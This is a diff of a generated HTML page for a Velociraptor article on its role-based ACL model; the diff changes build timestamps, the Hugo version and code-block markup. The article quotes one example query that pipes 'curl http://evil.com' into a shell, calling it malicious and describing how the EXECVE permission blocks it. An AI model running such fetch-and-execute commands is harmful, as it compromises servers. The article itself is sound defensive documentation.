@@ -2,21 +2,21 @@
 <head>
 <meta charset=utf-8>
 <meta name=viewport content="width=device-width,initial-scale=1">
-<meta name=generator content="Hugo 0.87.0">
+<meta name=generator content="Hugo 0.88.0">
 <meta name=description content="Paleontologists working together…">
 <link rel=icon href=/images/favicon.png type=image/png>
 <title>Velociraptor’s ACL model :: Velociraptor - Digging deeper!</title>
-<link href=/css/nucleus.css?1630429464 rel=stylesheet>
-<link href=/css/fontawesome-all.min.css?1630429464 rel=stylesheet>
-<link href=/css/featherlight.min.css?1630429464 rel=stylesheet>
-<link href=/css/perfect-scrollbar.min.css?1630429464 rel=stylesheet>
-<link href=/css/auto-complete.css?1630429464 rel=stylesheet>
-<link href=/css/theme.css?1630429464 rel=stylesheet>
-<link href=/css/tabs.css?1630429464 rel=stylesheet>
-<link href=/css/hugo-theme.css?1630429464 rel=stylesheet>
-<link href=/css/theme-mine.css?1630429464 rel=stylesheet>
-<link href=/css/atom-one-light.css?1630429464 rel=stylesheet><link href=/css/dark.css?1630429464 rel=stylesheet><link href=/css/syntax.css?1630429464 rel=stylesheet><link href=/css/light.css?1630429464 rel=stylesheet><link href=https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css?1630429464 rel=stylesheet>
-<script src=/js/jquery-3.3.1.min.js?1630429464></script>
+<link href=/css/nucleus.css?1630646996 rel=stylesheet>
+<link href=/css/fontawesome-all.min.css?1630646996 rel=stylesheet>
+<link href=/css/featherlight.min.css?1630646996 rel=stylesheet>
+<link href=/css/perfect-scrollbar.min.css?1630646996 rel=stylesheet>
+<link href=/css/auto-complete.css?1630646996 rel=stylesheet>
+<link href=/css/theme.css?1630646996 rel=stylesheet>
+<link href=/css/tabs.css?1630646996 rel=stylesheet>
+<link href=/css/hugo-theme.css?1630646996 rel=stylesheet>
+<link href=/css/theme-mine.css?1630646996 rel=stylesheet>
+<link href=/css/dark.css?1630646996 rel=stylesheet><link href=/css/syntax.css?1630646996 rel=stylesheet><link href=/css/light.css?1630646996 rel=stylesheet><link href=/css/hljs.css?1630646996 rel=stylesheet><link href=https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css?1630646996 rel=stylesheet>
+<script src=/js/jquery-3.3.1.min.js?1630646996></script>
 <style>:root #header+#content>#left>#rlblock_left{display:none!important}</style>
 <script></script>
 </head>
@@ -439,10 +439,10 @@ Velociraptor’s ACL model
 <h2 id=permissions>Permissions</h2>
 <p>In the previous section we saw how roles can be assigned to users to create a reasonable division of work and limit the power of each user to their prescribed role. How are these actually implemented in Velociraptor though?</p>
 <p>Velociraptor’s flexibility makes direct implementation of an RBAC challenging. Since Velociraptor is really just a VQL engine, it does different things depending on the query issued. For example, this server side query examines the results of a hunt:</p>
-<pre><code> SELECT * FROM hunt_results(hunt_id=”H.1234&quot;)
+<pre tabindex=0><code> SELECT * FROM hunt_results(hunt_id=”H.1234&quot;)
 </code></pre><p>It is a perfectly valid post processing query and should be allowed, even inside the notebook, by any analyst.</p>
 <p>However the query</p>
-<pre><code> SELECT * FROM execve(argv=[“bash”, “-c”, “curl http://evil.com | sh”])
+<pre tabindex=0><code> SELECT * FROM execve(argv=[“bash”, “-c”, “curl http://evil.com | sh”])
 </code></pre><p>Is clearly a malicious query and should be blocked from the notebook (It can result in server compromise).</p>
 <p>Velociraptor solves this by introducing a permission system. Each VQL plugin requires the caller to possess a particular permission. For example, the execve() plugin required the EXECVE permission (i.e. being allowed to run arbitrary shell commands). If the user does not have the permission, the plugin fails with an error.</p>
 <p>Let’s look at this example more closely. I will create a user called “analystbob” and assign them the <strong>analyst</strong> role:</p>
@@ -496,7 +496,7 @@ Velociraptor’s ACL model
 <p>Previously there was no access controls on the VQL issue by the API client, so an API client could run any VQL queries. Typically API clients are used to automate post processing of hunts and flows and so they rarely need more sophisticated permissions.</p>
 <p>It is now possible (even required) to limit the access of API clients by assigning them specific permissions depending on the queries they typically need to run.</p>
 <p>For example, suppose I have a python program which watches for server events so it can post process them. The program will run the query</p>
-<pre><code>SELECT * FROM watch_monitoring(artifact=’System.Flow.Completion’)
+<pre tabindex=0><code>SELECT * FROM watch_monitoring(artifact=’System.Flow.Completion’)
 </code></pre><p>This program only needs the following permissions</p>
 <ol>
 <li>
@@ -510,7 +510,7 @@ Velociraptor’s ACL model
 </li>
 </ol>
 <p>First I will create an API config file for this program, then grant the API client the minimum required permissions.</p>
-<pre><code>&gt; velociraptor config api_client api_config.yaml --name PythonPostProcess
+<pre tabindex=0><code>&gt; velociraptor config api_client api_config.yaml --name PythonPostProcess
 &gt; velociraptor acl grant PythonPostProcess ‘{“any_query”:true,”collect_server”:true,”read_results”:true}’
 </code></pre><p>Note the <strong>acl grant</strong> command grants an ACL policy object to the specific username or API keys name. The policy object is simply a JSON encoded object with the required permission set to true.</p>
 <p>We can now use the <a href=https://github.com/Velocidex/pyvelociraptor>pyvelociraptor</a> Python program to connect to the API and run the query.</p>
@@ -534,15 +534,15 @@ Velociraptor’s ACL model
 <div style=left:-1000px;overflow:scroll;position:absolute;top:-1000px;border:none;box-sizing:content-box;height:200px;margin:0;padding:0;width:200px>
 <div style=border:none;box-sizing:content-box;height:200px;margin:0;padding:0;width:200px></div>
 </div>
-<script src=/js/clipboard.min.js?1630429464></script>
-<script src=/js/perfect-scrollbar.min.js?1630429464></script>
-<script src=/js/perfect-scrollbar.jquery.min.js?1630429464></script>
-<script src=/js/jquery.sticky.js?1630429464></script>
-<script src=/js/featherlight.min.js?1630429464></script>
-<script src=/js/highlight.pack.js?1630429464></script>
-<script>hljs.initHighlightingOnLoad()</script>
-<script src=/js/modernizr.custom-3.6.0.js?1630429464></script>
-<script src=/js/learn.js?1630429464></script>
-<script src=/js/hugo-learn.js?1630429464></script>
+<script src=/js/clipboard.min.js?1630646996></script>
+<script src=/js/perfect-scrollbar.min.js?1630646996></script>
+<script src=/js/perfect-scrollbar.jquery.min.js?1630646996></script>
+<script src=/js/jquery.sticky.js?1630646996></script>
+<script src=/js/featherlight.min.js?1630646996></script>
+<script src=/js/highlight.min.js?1630646996></script>
+<script>hljs.highlightAll()</script>
+<script src=/js/modernizr.custom-3.6.0.js?1630646996></script>
+<script src=/js/learn.js?1630646996></script>
+<script src=/js/hugo-learn.js?1630646996></script>
 </body>
 </html>
